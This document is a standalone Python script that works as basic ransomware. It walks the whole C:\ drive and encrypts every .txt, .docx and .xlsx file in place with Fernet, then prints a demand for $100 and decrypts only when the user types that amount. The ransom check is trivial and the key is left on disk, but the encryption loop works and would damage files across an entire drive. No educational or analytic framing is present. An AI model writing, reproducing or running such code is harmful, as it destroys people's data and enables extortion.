import os
import sys
import time
from cryptography.fernet import Fernet

def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def load_key():
    return open("key.key", "rb").read()

def encrypt_file(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(filename, "wb") as file:
        file.write(encrypted_data)

def decrypt_file(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()
    decrypted_data = f.decrypt(encrypted_data)
    with open(filename, "wb") as file:
        file.write(decrypted_data)

def encrypt_files(key):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(".txt") or file.endswith(".docx") or file.endswith(".xlsx"):
                encrypt_file(os.path.join(root, file), key)

def decrypt_files(key):
    for root, dirs, files in os.walk("C:\\"):
        for file in files:
            if file.endswith(".txt") or file.endswith(".docx") or file.endswith(".xlsx"):
                decrypt_file(os.path.join(root, file), key)

def main():
    print("Generating encryption key...")
    generate_key()
    key = load_key()

    print("Encrypting files...")
    encrypt_files(key)

    print("Your files have been encrypted!")
    print("Please send us $100 to restore access to your files.")
    
    while True:
        payment = input("Enter payment amount: ")
        if payment == "$100":
            print("Payment received. Decrypting files...")
            decrypt_files(key)
            print("Files decrypted. Have a nice day!")
            break
        else:
            print("Incorrect payment amount. Please try again.")

if __name__ == "__main__":
    main()